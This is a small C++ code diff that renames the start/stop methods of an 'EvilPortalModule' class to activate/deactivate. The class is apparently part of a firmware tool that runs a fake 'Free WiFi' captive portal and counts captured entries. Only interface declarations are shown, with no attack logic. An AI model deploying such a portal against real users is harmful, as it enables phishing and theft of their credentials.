@@ -19,8 +19,8 @@ public:
 
     static EvilPortalModule& instance() { return *_self; }
 
-    void start(const String& ssid = "Free WiFi");
-    void stop();
+    void activate(const String& ssid = "Free WiFi");   // НЕ lifecycle start()
+    void deactivate();
     bool active() const { return _active; }
     String ssid() const { return _ssid; }
     int captured() const { return _captured; }
